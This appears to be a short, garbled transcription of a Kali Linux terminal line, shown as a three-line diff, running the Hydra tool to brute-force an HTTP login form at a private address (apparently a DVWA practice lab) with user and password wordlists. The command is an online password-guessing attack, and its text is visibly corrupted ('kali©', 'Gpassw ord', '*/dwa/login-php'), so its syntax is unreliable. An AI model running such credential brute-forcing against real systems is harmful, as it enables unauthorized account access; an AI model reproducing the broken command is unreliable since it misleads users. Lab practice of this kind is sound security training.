@@ -1,0 +1,3 @@
+kali© kali)-[~/Downloads]
+hydra 192.168.0.154 http-form-post */dwa/login-php: username=^USER^Gpassw ord=^PASS^&Login=submit:Login failed*
+-L user.txt -P pass.txt
